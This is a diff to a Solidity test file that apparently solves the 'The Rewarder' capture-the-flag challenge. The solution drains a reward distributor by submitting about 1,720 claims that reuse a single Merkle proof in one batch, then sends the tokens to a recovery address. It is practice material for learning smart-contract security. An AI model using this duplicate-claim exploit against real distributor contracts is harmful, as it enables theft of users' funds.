@@ -66,17 +66,13 @@ contract TheRewarderChallenge is Test {
         // Create DVT distribution
         dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
-            token: IERC20(address(dvt)),
-            newRoot: dvtRoot,
-            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
+            token: IERC20(address(dvt)), newRoot: dvtRoot, amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
         });
 
         // Create WETH distribution
         weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
-            token: IERC20(address(weth)),
-            newRoot: wethRoot,
-            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
+            token: IERC20(address(weth)), newRoot: wethRoot, amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
         });
 
         // Let's claim rewards for Alice.
@@ -148,7 +144,40 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt)); // 11524763827831882
+        tokensToClaim[1] = IERC20(address(weth)); // 11524763827831882
+
+        Claim[] memory claims = new Claim[](867 + 853);
+
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);
+
+        for (uint i = 0; i < 867; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: 11524763827831882,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: dvtProof
+            });
+        }        
+
+        for (uint i = 867; i < 867 + 853; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: 1171088749244340,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: wethProof 
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery,TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)) );
+        weth.transfer(recovery, TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)));
     }
 
     /**
